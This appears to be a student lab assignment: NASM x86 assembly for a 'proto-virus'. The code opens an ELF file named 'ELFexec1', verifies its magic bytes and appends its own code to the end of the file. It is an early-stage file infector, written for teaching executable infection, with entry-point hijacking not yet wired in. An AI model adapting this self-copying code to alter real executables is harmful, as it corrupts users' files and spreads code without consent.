%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
%define ELFHDR_size 52
%define ELFHDR_phoff	28


    global _start
    
section .text
    
_start:	
	push	ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
	
	;CODE START
	
    ; OPEN THE FILE
    open FileName, RDWR, 0x700
    
    cmp eax, 0
    jl VirusExit
    
    mov dword [ebp - 4], eax ; SAVE THE FD IN THE FIRST LOCAL VARIBALE
    
    ; MAKE ESI HOLD THE ADDRESS OF THE BUFFER FOR THE MAGIC BYTES (ONLY FIRST FOUR)
    lea esi, [ebp-8]
    mov edi, [ebp-4]
    ; READ THE FILE
    read edi, esi, 4
    
    cmp dword [esi], 0x464C457F	; compare to 0x7f 'E' 'L' 'F' (little endian)
	jne not_elf
	
    ; IF IT IS AN ELF FILE PRINT OUTSTR
    elf_file:
        ; WRITE MESSAGE
        write 1, OutStr, outstr_len
        ; GO TO END OF FILE
        lseek edi, 0, SEEK_END
        ; WRITE TO FILE
        write edi, _start, virus_end - _start
        jmp VirusExit
        
    ; ELSE PRINT FAILTSTR
    not_elf:
        write 1, Failstr, failstr_len
        jmp VirusExit
    
VirusExit:
       exit 0            ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)

get_my_loc:
	call next_i
next_i:
	pop ecx
	ret
	
FileName: db "ELFexec1", 0
OutStr: db "The lab 9 proto-virus strikes!", 10, 0
outstr_len: equ $ - OutStr
Failstr: db "perhaps not", 10 , 0
failstr_len: equ $ - Failstr 


PreviousEntryPoint: dd VirusExit
virus_end:


